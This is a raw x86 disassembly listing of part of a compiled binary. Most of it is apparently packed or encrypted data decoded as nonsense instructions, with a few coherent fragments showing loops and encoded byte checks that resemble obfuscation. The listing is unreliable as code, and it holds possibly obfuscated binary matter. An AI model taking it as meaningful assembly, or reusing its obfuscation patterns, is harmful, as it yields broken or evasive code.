  416f75:	(bad)  
  416f76:	leave  
  416f77:	mov    edx,0x8ad8da92
  416f7c:	xlat   BYTE PTR ds:[ebx]
  416f7d:	mov    ds:0xc28131b2,eax
  416f82:	lock stos BYTE PTR es:[edi],al
  416f84:	add    DWORD PTR [esi],0xffffffae
  416f87:	mov    ss,WORD PTR [edx-0x23]
  416f8a:	mov    ss,WORD PTR [edi+0x1ea4c6a2]
  416f90:	sbb    al,0x46
  416f92:	neg    ah
  416f94:	push   ebp
  416f95:	dec    DWORD PTR es:[ebp+0x5ee0267f]
  416f9c:	xchg   edi,eax
  416f9d:	cli    
  416f9e:	loop   0x416fd3
  416fa0:	mov    esi,0xa197d020
  416fa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fa6:	and    ebx,edi
  416fa8:	retf   0xc6f1
  416fab:	push   cs
  416fac:	addr16 je 0x416f6e
  416faf:	push   esi
  416fb0:	push   ebp
  416fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fb2:	shl    BYTE PTR [ecx+ecx*2],cl
  416fb5:	xchg   ebx,eax
  416fb6:	cmp    dl,BYTE PTR [edi-0x80]
  416fb9:	jno    0x416f73
  416fbb:	push   0x18
  416fbd:	dec    esi
  416fbe:	fwait
  416fbf:	stos   BYTE PTR es:[edi],al
  416fc0:	add    ecx,DWORD PTR ds:0xfaa07f7c
  416fc6:	sub    esp,esi
  416fc8:	xchg   ecx,eax
  416fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fca:	into   
  416fcb:	mov    ah,0x2f
  416fcd:	push   0xffffffd9
  416fcf:	lock push esp
  416fd1:	shr    DWORD PTR [eax-0x51074046],1
  416fd7:	adc    bh,BYTE PTR [edi-0x39]
  416fda:	adc    al,BYTE PTR [ebx]
  416fdc:	rcl    BYTE PTR [esp+esi*2+0x55],0x58
  416fe1:	sbb    bl,ch
  416fe3:	jae    0x41703f
  416fe5:	add    dh,BYTE PTR [ecx+0x50]
  416fe8:	xchg   ecx,eax
  416fe9:	add    edi,DWORD PTR [esi+0x19]
  416fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fed:	lahf   
  416fee:	dec    edx
  416fef:	aas    
  416ff0:	cmp    al,BYTE PTR [ebp+0x0]
  416ff3:	ins    DWORD PTR es:[edi],dx
  416ff4:	jmp    DWORD PTR [eax]
  416ff6:	or     bl,BYTE PTR [ebx+0x27a772cc]
  416ffc:	call   0x70b4:0x84f285
  417003:	xchg   edi,eax
  417004:	imul   DWORD PTR [eax+0x6d]
  417007:	fnsave [ecx]
  417009:	enter  0xcc9,0x17
  41700d:	cmc    
  41700e:	push   eax
  41700f:	ss and al,0xda
  417012:	inc    ebp
  417013:	dec    ebx
  417014:	fld    DWORD PTR [esi-0x6483d3]
  41701a:	cmp    esp,edi
  41701c:	aaa    
  41701d:	pop    ds
  41701e:	dec    edi
  41701f:	loop   0x41701d
  417021:	ins    DWORD PTR es:[edi],dx
  417022:	ins    DWORD PTR es:[edi],dx
  417023:	mov    al,0xfb
  417025:	pop    ebx
  417026:	xor    ch,BYTE PTR [esi-0x34c083d8]
  41702c:	cmp    DWORD PTR [ebp-0x8753634],ebp
  417032:	adc    ebx,DWORD PTR [edx-0x6042157d]
  417038:	loop   0x41702b
  41703a:	jne    0x417061
  41703c:	and    eax,0x62e54aba
  417041:	rcr    DWORD PTR [ecx+0x16],cl
  417044:	lds    esp,FWORD PTR [edi+edx*8]
  417047:	retf   0xec87
  41704a:	dec    edi
  41704b:	dec    edx
  41704c:	popa   
  41704d:	mov    ecx,0x6454f24
  417052:	add    eax,esi
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi-0x3b99b545],edx
  41706d:	add    BYTE PTR [ebp+0x2b],al
  417070:	jg     0x4170ea
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x417070
  417077:	sysexit 
  417079:	mov    WORD PTR [ecx],gs
  41707b:	cmp    bl,bh
  41707d:	in     eax,0x24
  41707f:	iret   
  417080:	lahf   
  417081:	xchg   dl,dl
  417083:	or     al,BYTE PTR [esi]
  417085:	(bad)  
  417088:	dec    ebx
  417089:	loopne 0x41703c
  41708b:	xor    eax,0x52e82272
  417090:	or     eax,0xdfb5b9c4
  417095:	dec    ecx
  417096:	lds    ebp,FWORD PTR [ebx]
  417098:	xchg   esp,eax
  417099:	in     al,dx
  41709a:	cmc    
  41709b:	iret   
  41709c:	cmp    BYTE PTR [edx+0x656594ca],ah
  4170a2:	fwait
  4170a3:	call   0x74e3f682
  4170a8:	ins    DWORD PTR es:[edi],dx
  4170a9:	mov    dl,0xc3
  4170ab:	aad    0xbe
  4170ad:	and    eax,0x4eb020ed
  4170b2:	fwait
  4170b3:	or     BYTE PTR [ebx],ch
  4170b5:	add    eax,0x9b71863c
  4170ba:	mov    ecx,0xa7054334
  4170bf:	push   cs
  4170c0:	and    eax,0x191ab153
  4170c5:	cli    
  4170c6:	pop    edx
  4170c7:	or     eax,0xc349b03d
  4170cc:	add    esp,ebp
  4170ce:	mov    al,0xb1
  4170d0:	jl     0x417086
  4170d2:	pop    esi
  4170d3:	mov    ebp,0xb877b115
  4170d8:	mov    WORD PTR [edx-0x2fb1b285],?
  4170de:	adc    DWORD PTR ds:0x487f0a,edx
  4170e4:	inc    esi
  4170e5:	cmp    dh,BYTE PTR ds:0xa3212c8
  4170eb:	in     al,0x8a
  4170ed:	pop    edi
  4170ee:	mov    edi,0x489268a2
  4170f3:	or     BYTE PTR [esi+0x5f],al
  4170f6:	popa   
  4170f7:	push   ecx
  4170f8:	dec    ebx
  4170f9:	jp     0x417091
  4170fb:	jns    0x417165
  4170fd:	mov    al,BYTE PTR [ebx+0x22]
  417100:	pop    ebp
  417101:	xchg   esp,eax
  417102:	shl    esp,0xa3
  417105:	cld    
  417106:	mov    ah,0x9c
  417108:	push   0xde5801a6
  41710d:	loop   0x41711c
  41710f:	aam    0xde
  417111:	inc    edx
  417112:	sbb    al,0x14
  417114:	lods   al,BYTE PTR ds:[esi]
  417115:	add    al,0xce
  417117:	xchg   ecx,eax
  417118:	cld    
  417119:	div    BYTE PTR [eax]
  41711b:	pop    ss
  41711c:	rol    BYTE PTR [esi-0x73],0xa9
  417120:	lods   al,BYTE PTR ds:[esi]
  417121:	sub    DWORD PTR [ecx+0x28a0a541],ecx
  417127:	sub    BYTE PTR [ebx+0x56],ch
  41712a:	mov    al,0x3d
  41712c:	and    eax,DWORD PTR [ebx-0x27]
  41712f:	xchg   esi,eax
  417130:	fisubr DWORD PTR [edi+0x73185b80]
  417136:	jl     0x41710e
  417138:	rol    DWORD PTR fs:[ebx+0xe35c6df],cl
  41713f:	xchg   ebx,eax
  417140:	xchg   edx,eax
  417141:	int    0x9d
  417143:	js     0x417116
  417145:	ja     0x417199
  417147:	retf   0xe20d
  41714a:	cdq    
  41714b:	call   0x60ad308f
  417150:	pushf  
  417151:	mov    ecx,0x6ee83237
  417156:	add    al,dl
  417158:	sbb    BYTE PTR [ecx+edx*2-0x57],dh
  41715c:	or     eax,0x152c6d44
  417161:	test   eax,0x7d33f95c
  417166:	or     ah,BYTE PTR [ecx+0x6aad2c56]
  41716c:	cmc    
  41716d:	adc    bh,dl
  41716f:	or     esi,DWORD PTR [edx+0x2631409d]
  417175:	pop    edi
  417176:	int    0x39
  417178:	cmp    bl,BYTE PTR [eax]
  41717a:	(bad)  
  41717b:	dec    ebx
  41717c:	inc    eax
  41717d:	and    cl,BYTE PTR [ecx]
  41717f:	popf   
  417180:	mov    ah,0x32
  417182:	rcr    ebp,cl
  417184:	push   ebx
  417185:	xor    dh,BYTE PTR [ecx+0x64a87325]
  41718b:	lods   eax,DWORD PTR ds:[esi]
  41718c:	adc    dl,al
  41718e:	add    BYTE PTR [esp+eax*1],0xb
  417192:	push   0x8a87ce08
  417197:	imul   esi,DWORD PTR [edi*2+0x4c98f971],0xae955382
  4171a2:	add    DWORD PTR [edx+0x7b],0xba03883d
  4171a9:	mov    ah,0xb0
  4171ab:	into   
  4171ac:	pop    eax
  4171ad:	scas   al,BYTE PTR es:[edi]
  4171ae:	fs (bad) 
  4171b0:	lods   eax,DWORD PTR ds:[esi]
  4171b1:	dec    esi
  4171b2:	xor    eax,0xbfed6e7d
  4171b7:	das    
  4171b8:	lea    edx,[ecx+0x14]
  4171bb:	in     al,dx
  4171bc:	mov    esi,0xe3ef13c9
  4171c1:	int3   
  4171c2:	(bad)  
  4171c3:	test   eax,0x117a5b72
  4171c8:	or     al,0xf3
  4171ca:	rcl    bl,0x41
  4171cd:	nop
  4171ce:	(bad)  
  4171cf:	in     al,0x85
  4171d1:	pop    esp
  4171d2:	push   esp
  4171d3:	jl     0x4171c1
  4171d5:	fs dec esp
  4171d7:	sbb    eax,DWORD PTR [edx]
  4171d9:	mov    ebx,0x29ced941
  4171de:	out    dx,eax
  4171df:	fsub   DWORD PTR [esi+0x6bd8c822]
  4171e5:	jp     0x417220
  4171e7:	sub    al,0xd5
  4171ea:	out    dx,eax
  4171eb:	push   0x4e94f197
  4171f0:	push   esi
  4171f1:	pop    edx
  4171f2:	xchg   ebx,eax
  4171f3:	mov    WORD PTR [edx],ds
  4171f5:	rcl    BYTE PTR [esi-0x48],1
  4171f8:	call   esp
  4171fa:	jb     0x41719f
  4171fc:	repz or al,0xfd
  4171ff:	xchg   ebx,eax
  417200:	out    dx,eax
  417201:	dec    eax
  417202:	xor    dh,cl
  417204:	not    al
  417206:	push   esi
  417207:	sbb    edi,DWORD PTR [esp+edi*1+0x4a]
  41720b:	and    ah,dh
  41720d:	not    BYTE PTR ds:0x898016c
  417213:	xlat   BYTE PTR ds:[ebx]
  417214:	fbld   TBYTE PTR [ecx-0xb]
  417217:	mov    edi,0x91e07af4
  41721c:	icebp  
  41721d:	pop    ds
  41721e:	mov    eax,ds:0x4cde341
  417223:	dec    esi
  417224:	dec    ecx
  417225:	mov    ds:0x30c0eed3,eax
  41722a:	cmc    
  41722b:	sbb    ah,ah
  41722d:	ret    0x642f
  417230:	es xchg ebp,eax
  417232:	and    dh,BYTE PTR [edi+0x65]
  417235:	inc    eax
  417236:	jno    0x4171e8
  417238:	jle    0x4171f7
  41723a:	(bad)  
  41723b:	xchg   al,bh
  41723d:	sbb    esi,ecx
  41723f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417240:	leave  
  417241:	adc    BYTE PTR [edi-0x64],al
  417244:	je     0x417295
  417246:	push   ebx
  417247:	and    BYTE PTR [ebx],dh
  417249:	xor    ecx,ebx
  41724b:	cmp    DWORD PTR [ebx+0x3b],eax
  41724e:	retf   
  41724f:	ret    
  417250:	cwde   
  417251:	or     al,BYTE PTR [edx+ebp*2-0x5e8798b0]
  417258:	lods   al,BYTE PTR ds:[esi]
  417259:	mov    dl,BYTE PTR [ecx+0xd888aab]
  41725f:	outs   dx,BYTE PTR ds:[esi]
  417260:	push   esi
  417261:	and    eax,edi
  417263:	push   edx
  417264:	les    esp,FWORD PTR [eax+0x57]
  417267:	inc    ecx
  417268:	or     bl,BYTE PTR [eax-0x2b0d97c7]
  41726e:	xor    edi,ebp
  417270:	push   esi
  417271:	mov    bl,BYTE PTR [ebp-0x45]
  417274:	mov    ebx,0x9a08bab2
  417279:	jecxz  0x417207
  41727b:	ficomp DWORD PTR [ecx+edi*4+0x6]
  41727f:	into   
  417280:	jnp    0x4172b1
  417282:	stos   BYTE PTR es:[edi],al
  417283:	sbb    dh,BYTE PTR [eax+edi*4+0x36a6d3ca]
  41728a:	mov    eax,ds:0x17dcc9c3
  41728f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417290:	mov    ecx,0xde79639e
  417295:	sbb    DWORD PTR [eax-0x56aa38b4],ebp
  41729b:	or     eax,DWORD PTR [edi-0x4f49804b]
  4172a1:	push   ebx
  4172a2:	mov    ds:0xd3f59192,al
  4172a7:	cmp    eax,0x232b39f9
  4172ac:	into   
  4172ad:	xchg   DWORD PTR [ebp+0x58],esp
  4172b0:	mov    dl,0x80
  4172b2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4172b4:	pop    esp
  4172b5:	dec    ebp
  4172b6:	jno    0x4172ab
  4172b8:	(bad)  
  4172b9:	outs   dx,DWORD PTR ds:[esi]
  4172ba:	sbb    esp,DWORD PTR [ecx]
  4172bc:	out    0xa7,eax
  4172be:	and    DWORD PTR [edi+0x23],edi
  4172c1:	jl     0x417311
  4172c3:	push   0x13
  4172c5:	in     al,0x14
  4172c7:	dec    ebx
  4172c8:	pop    edi
  4172c9:	pop    esp
  4172ca:	(bad)  [eax+0x30]
  4172cd:	sub    esp,eax
  4172cf:	not    ecx
  4172d1:	cwde   
  4172d2:	dec    edx
  4172d3:	add    DWORD PTR [ebx],eax
  4172d5:	mov    ch,0x82
  4172d7:	pushf  
  4172d8:	scas   al,BYTE PTR es:[edi]
  4172d9:	sub    eax,0x63d45142
  4172de:	sti    
  4172df:	mov    dh,0x59
  4172e1:	push   ebx
  4172e2:	fistp  QWORD PTR [eax+esi*1-0x801e3e]
  4172e9:	mov    dl,0x24
  4172eb:	gs (bad) 
  4172ed:	outs   dx,BYTE PTR ds:[esi]
  4172ee:	js     0x4172f2
  4172f0:	(bad)
  4172f3:	lea    edi,[edx+0x0]
  4172f6:	push   eax
  4172f7:	out    0x7f,eax
  4172f9:	inc    esp
  4172fa:	dec    esp
  4172fb:	dec    esi
  4172fc:	data16 ja 0x417373
  4172ff:	fisubr WORD PTR ds:0x2611c141
  417305:	cmc    
  417306:	imul   eax,DWORD PTR ds:0x265b61f6,0xbc0ce7a6
  417310:	sar    bh,cl
  417312:	jne    0x41730c
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	rcl    BYTE PTR [edi],1
  417334:	mov    bl,0xa6
  417336:	mov    ds:0x787f28e2,eax
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x4172fd
  417340:	cs pop edi
  417342:	inc    edi
  417343:	jmp    0x4173a5
  417345:	dec    esp
  417346:	fld    TBYTE PTR [esi-0x6dcfffbe]
  41734c:	sub    eax,0xe38634b7
  417351:	test   edi,ecx
  417353:	sub    eax,0xcaa7b588
  417358:	arpl   WORD PTR [edx],bp
  41735a:	push   ecx
  41735b:	dec    ecx
  41735c:	int3   
  41735d:	(bad)  
  41735e:	repz lea esi,ds:[esi+edi*2]
  417363:	pop    ss
  417364:	lds    esi,FWORD PTR ds:0x5a70ef2c
  41736a:	into   
  41736b:	adc    DWORD PTR [edx],0x8f2adfe
  417371:	xchg   esp,eax
  417372:	inc    edi
  417373:	add    BYTE PTR [esi-0x51],dl
  417376:	push   ebp
  417377:	sbb    ecx,DWORD PTR [ecx+0x3aa0266e]
  41737d:	inc    edx
  41737e:	inc    DWORD PTR [edi-0x78fac4e8]
  417384:	mov    esp,0x75d4fa7e
  417389:	push   ebx
  41738a:	bound  edi,QWORD PTR [edi+0xb]
  41738d:	jae    0x4173b2
  41738f:	mov    eax,0x2629afcb
  417394:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  417396:	dec    ebp
  417397:	je     0x417368
  417399:	sbb    DWORD PTR [esp+esi*4-0x62],eax
  41739d:	mov    al,0xad
  41739f:	cmp    ecx,edx
  4173a1:	les    ebx,FWORD PTR [ecx+0x35]
  4173a4:	fcom   DWORD PTR [edx]
  4173a6:	aaa    
  4173a7:	mov    esp,0xb0789cb6
  4173ac:	fld    TBYTE PTR [ebp-0x7aa3e88a]
  4173b2:	inc    edx
  4173b3:	add    dh,BYTE PTR [edx]
  4173b5:	das    
  4173b6:	leave  
  4173b7:	mov    ecx,0x3865858f
  4173bc:	add    DWORD PTR [edi],esp
  4173be:	inc    esp
  4173bf:	or     al,0xce
  4173c1:	cdq    
  4173c2:	es mov bh,0x82
  4173c5:	retf   
  4173c6:	iret   
  4173c7:	repnz fwait
  4173c9:	popa   
  4173ca:	ss xchg ebx,eax
  4173cc:	pop    ss
  4173cd:	mov    ds:0xf94f49bd,al
  4173d2:	adc    BYTE PTR [edx+0x46],dh
  4173d5:	jbe    0x4173d9
  4173d7:	outs   dx,DWORD PTR ds:[esi]
  4173d8:	rcl    eax,1
  4173da:	pushf  
  4173db:	aaa    
  4173dc:	adc    DWORD PTR [edx],edx
  4173de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173df:	inc    DWORD PTR [ecx]
  4173e1:	enter  0xd086,0xc0
  4173e5:	xchg   ebx,eax
  4173e6:	fs mov al,0xd9
  4173e9:	scas   eax,DWORD PTR es:[edi]
  4173ea:	std    
  4173eb:	imul   DWORD PTR [ecx]
  4173ed:	cmp    eax,0x10852667
  4173f2:	mov    al,BYTE PTR [esi]
  4173f4:	lea    edi,[ebx+ecx*8]
  4173f7:	js     0x4173fb
  4173f9:	fs scas eax,DWORD PTR es:[edi]
  4173fb:	xor    BYTE PTR ds:0x413845cb,dl
  417401:	rol    DWORD PTR [ebp+0x303fd3b4],0x87
  417408:	mov    ch,0x33
  41740a:	mov    edx,0x6856a3c
  41740f:	jae    0x417403
  417411:	lea    edi,[edx]
  417413:	ret    0xb6ad
  417416:	out    dx,eax
  417417:	sbb    DWORD PTR [edi-0x2ce973ad],esp
  41741d:	gs loopne 0x417477
  417420:	cmc    
  417421:	push   0xbacd0922
  417426:	loope  0x41744f
  417428:	fist   DWORD PTR [edx]
  41742a:	mov    ?,WORD PTR [ebp-0x3b2d89f8]
  417430:	mov    cl,0x3
  417432:	clc    
  417433:	clc    
  417434:	pop    edi
  417435:	stos   DWORD PTR es:[edi],eax
  417436:	cmp    al,0xdc
  417438:	in     al,dx
  417439:	mov    ch,0x63
  41743b:	loopne 0x4173cb
  41743d:	iret   
  41743e:	int3   
  41743f:	lea    esi,[edi+eax*4]
  417442:	int    0x68
  417444:	call   DWORD PTR [ebp-0x24]
  417447:	retf   0x4f44
  41744a:	lods   eax,DWORD PTR ds:[esi]
  41744b:	cld    
  41744c:	jl     0x417446
  41744e:	pusha  
  41744f:	ss push edi
  417451:	stc    
  417452:	(bad)  
  417453:	test   al,0x57
  417455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417456:	cmp    dl,BYTE PTR [ecx]
  417458:	xchg   DWORD PTR [esi],ecx
  41745a:	ret    
  41745b:	inc    edx
  41745c:	loop   0x4174d8
  41745e:	jle    0x4174d1
  417460:	cli    
  417461:	mov    bh,0x2d
  417463:	dec    esi
  417464:	adc    ebx,DWORD PTR [edx-0x1]
  417467:	xchg   esp,eax
  417468:	mov    dh,bl
  41746a:	sbb    bl,BYTE PTR [ecx]
  41746c:	iret   
  41746d:	xchg   ch,dh
  41746f:	aam    0x78
  417471:	test   DWORD PTR [ecx+ebp*1],esi
  417474:	fidiv  DWORD PTR [eax+0xf85f444]
  41747a:	mov    ds:0x609a1c76,eax
  41747f:	ret    
  417480:	ins    BYTE PTR es:[edi],dx
  417481:	jle    0x41747c
  417483:	cld    
  417484:	inc    ebp
  417485:	inc    edi
  417486:	sub    esp,edi
  417488:	stc    
  417489:	lahf   
  41748a:	ds fincstp 
  41748d:	push   esi
  41748e:	repnz mov al,0xec
  417491:	cmp    eax,0x1b0ea7b
  417496:	call   0x97dd:0xdf4959a2
  41749d:	push   edi
  41749e:	iret   
  41749f:	jg     0x417464
  4174a1:	mov    esp,DWORD PTR [ecx-0x62773e16]
  4174a7:	mov    ds:0xf0375de2,eax
  4174ac:	pop    esp
  4174ad:	jg     0x417434
  4174af:	loopne 0x41749c
  4174b1:	cld    
  4174b2:	sub    eax,DWORD PTR [edx-0x1efb5ecd]
  4174b8:	jg     0x417517
  4174ba:	cmp    ecx,DWORD PTR [edx+eax*8]
  4174bd:	jae    0x417468
  4174bf:	sti    
  4174c0:	test   eax,0xec124dd0
  4174c5:	das    
  4174c6:	xchg   ebp,eax
  4174c7:	pusha  
  4174c8:	cld    
  4174c9:	dec    edi
  4174ca:	push   0xffffffb5
  4174cc:	das    
  4174cd:	sar    DWORD PTR [eax-0x3c],cl
  4174d0:	add    al,0x47
  4174d2:	cld    
  4174d3:	push   edi
  4174d4:	or     bh,BYTE PTR [esi]
  4174d6:	mov    ds:0x3e748ae7,al
  4174db:	add    ebx,DWORD PTR [edx+0x2e]
  4174de:	push   cs
  4174df:	iret   
  4174e0:	xor    eax,DWORD PTR [edx-0x1ef43541]
  4174e6:	jns    0x417552
  4174e8:	xchg   ebx,eax
  4174e9:	sub    bl,BYTE PTR ds:0x20cecdd0
  4174ef:	jbe    0x417508
  4174f1:	cmp    eax,0xf10f0230
  4174f6:	jle    0x417490
  4174f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174f9:	or     DWORD PTR [ecx+ecx*4-0x5f981e5d],esp
  417500:	mov    ebx,fs
  417502:	ins    BYTE PTR es:[edi],dx
  417503:	cwde   
  417504:	dec    ecx
  417505:	mov    WORD PTR [ecx+0x5310fc3f],cs
  41750b:	push   ecx
  41750c:	rol    BYTE PTR [edi+ebx*4-0x6cd68d36],0xe0
  417514:	pop    edi
  417515:	dec    ecx
  417516:	(bad)  
  417517:	sub    DWORD PTR ds:0x82bf7bcf,eax
  41751d:	ret    0x99fe
  417520:	lahf   
  417521:	jnp    0x417596
  417523:	out    0xe0,al
  417525:	(bad)  
  417527:	mov    ecx,0x9c4a4e73
  41752c:	or     ch,BYTE PTR [ecx+0x3]
  41752f:	jmp    0x7d55:0xb84f13e7
  417536:	xchg   esp,eax
  417537:	in     al,dx
  417538:	inc    ecx
  417539:	sbb    dl,BYTE PTR [edx]
  41753b:	jne    0x417520
  41753d:	push   eax
  41753e:	test   BYTE PTR [esi],cl
  417540:	xchg   esp,eax
  417541:	mov    bl,0xd2
  417543:	mov    eax,0x3173147d
  417548:	test   al,bh
  41754a:	jle    0x4174ec
  41754c:	fwait
  41754d:	stos   BYTE PTR es:[edi],al
  41754e:	std    
  41754f:	mov    bl,0x4d
  417551:	mov    ebp,edi
  417553:	xor    eax,0xe8a90850
  417558:	sbb    al,0x55
  41755a:	ret    
  41755b:	out    0x66,al
  41755d:	cmp    DWORD PTR [ebp+0x7f33a2f9],ecx
  417563:	mov    ebp,0xbe8d36f4
  417568:	jno    0x4175d0
  41756a:	jne    0x4175c0
  41756c:	pop    edi
  41756d:	dec    esp
  41756e:	in     eax,dx
  41756f:	mov    ds:0x22416b8a,eax
  417574:	push   0xcd090aaa
  417579:	das    
  41757a:	dec    esi
  41757b:	sar    BYTE PTR [edx],cl
  41757d:	jmp    FWORD PTR [edi+esi*4]
  417580:	mov    cl,0xed
  417582:	imul   edi,DWORD PTR [ebx-0x2706048f],0xffffff85
  417589:	push   edx
  41758a:	mov    edi,0x5de13fae
  41758f:	push   es
  417590:	sbb    DWORD PTR [edi+esi*2],ebp
  417593:	rep lods al,BYTE PTR ds:[esi]
  417595:	in     al,0x10
  417597:	sub    al,0x3c
  417599:	push   es
  41759a:	popa   
  41759b:	stos   BYTE PTR es:[edi],al
  41759c:	or     edx,DWORD PTR ds:0x3eadd502
  4175a2:	fisttp DWORD PTR [ebp+0x71]
  4175a5:	lds    ebx,FWORD PTR [edx+edi*4-0x6b]
  4175a9:	imul   esi,ebx,0x2dda1bf6
  4175af:	cdq    
  4175b0:	mov    eax,ds:0xf8bfd9d8
  4175b5:	mov    esp,DWORD PTR [esi-0x4ff9600a]
  4175bb:	scas   al,BYTE PTR es:[edi]
  4175bc:	xchg   DWORD PTR [edx+0x6],ecx
  4175bf:	loope  0x4175c6
  4175c1:	inc    esp
  4175c2:	cs ret 
  4175c4:	xchg   ebx,eax
  4175c5:	adc    bl,BYTE PTR ds:0xc2e8922a
  4175cb:	mov    edi,0x7ec6bff4
  4175d0:	lock fisttp QWORD PTR [esp+esi*1-0x4c73f0ba]
  4175d9:	enter  0xc603,0x5e
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42aff9,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42aff9,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42aff9,0x5
  417603:	jne    0x417621
  417609:	push   0x42af39
  41760e:	push   0x42af85
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42b0d2
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42aff9,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42aff9
  417633:	dec    eax
  417634:	mov    ds:0x42aff9,eax
  417639:	mov    eax,ds:0x42aff9
  41763e:	dec    eax
  41763f:	mov    ds:0x42aff9,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42af8d,0x0
  41765b:	mov    eax,ds:0x42af8d
  417660:	inc    eax
  417661:	mov    ds:0x42af8d,eax
  417666:	cmp    DWORD PTR ds:0x42af8d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42b272
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42af8d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	sbb    DWORD PTR [edx+0x2d7f4d46],ebp
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0xc378787e
  4176c7:	adc    BYTE PTR [edi+0x6d],ah
  4176ca:	mov    al,bl
  4176cc:	test   dl,ch
  4176ce:	mov    dh,0xb5
  4176d0:	jmp    0x4b91:0x56fbb94a
  4176d7:	mov    DWORD PTR [eax+0x32],edi
  4176da:	mov    bh,0x8e
  4176dc:	jmp    0xe0029372
  4176e1:	jmp    0x41775b
  4176e3:	mov    ebx,0x5a97e760
  4176e8:	mov    eax,ds:0x9992fbff
  4176ed:	imul   edi,esi,0xffffffab
  4176f0:	leave  
  4176f1:	xchg   DWORD PTR [ecx-0x77],edx
  4176f4:	neg    DWORD PTR [edx-0x24680033]
  4176fa:	inc    ebp
  4176fb:	mov    al,ds:0x77f1d9d6
  417700:	lods   eax,DWORD PTR ds:[esi]
  417701:	sahf   
  417702:	test   eax,0x9e5cb340
  417707:	add    DWORD PTR [ebx],ecx
  417709:	(bad)  
  41770a:	jnp    0x41770f
  41770c:	jno    0x417698
  41770e:	scas   eax,DWORD PTR es:[edi]
  41770f:	add    BYTE PTR [edx+0x2722b295],ah
  417715:	mov    cl,0x21
  417717:	pop    ebp
  417718:	rol    DWORD PTR [ebp-0x536b6a13],cl
  41771e:	xchg   esp,eax
  41771f:	push   0xffffffa6
  417721:	out    dx,eax
  417722:	sti    
  417723:	hlt    
  417724:	jecxz  0x41770f
  417726:	xor    eax,0xe3fa80d
  41772b:	jo     0x41772e
  41772d:	adc    edx,DWORD PTR [edi-0x32]
  417730:	cmp    bl,bh
  417732:	jnp    0x4176ef
  417734:	stos   DWORD PTR es:[edi],eax
  417735:	scas   eax,DWORD PTR es:[edi]
  417736:	mov    ebx,0xe609fdce
  41773b:	sbb    BYTE PTR [eax],0xc4
  41773e:	mov    ah,0x3f
  417740:	push   ebx
  417741:	pop    eax
  417742:	into   
  417743:	scas   eax,DWORD PTR es:[edi]
  417744:	mov    esp,0x51039877
  417749:	xor    DWORD PTR [esi-0x2bfb988],ebx
  41774f:	mov    bl,0xc4
  417751:	gs (bad) 
  417753:	jecxz  0x41777c
  417755:	aas    
  417756:	xor    eax,0x5b748bf4
  41775b:	mov    DWORD PTR [ecx+0x52],0xde970f56
  417762:	xlat   BYTE PTR ds:[ebx]
  417763:	pop    esp
  417764:	pop    ebx
  417765:	inc    ebx
  417766:	dec    esp
  417767:	push   ebp
  417768:	pop    esi
  417769:	adc    eax,DWORD PTR [eax-0x5e7f7a8b]
  41776f:	fild   QWORD PTR [ebx]
  417771:	xchg   ebx,eax
  417772:	nop
  417773:	lods   al,BYTE PTR ds:[esi]
  417774:	(bad)  
  417775:	cli    
  417776:	add    BYTE PTR [ebp+0x6b],ah
  417779:	xchg   ebp,eax
  41777a:	sub    eax,0x75c6d767
  41777f:	js     0x41778d
  417781:	jo     0x41776c
  417783:	(bad)
  417786:	inc    esi
  417787:	push   edi
  417788:	sub    al,0x2
  41778a:	outs   dx,BYTE PTR ds:[esi]
  41778b:	jb     0x417781
  41778d:	pop    ss
  41778e:	add    eax,esp
  417790:	lds    eax,FWORD PTR [eax]
  417792:	lock and eax,0x757e4877
  417798:	dec    edx
  417799:	cdq    
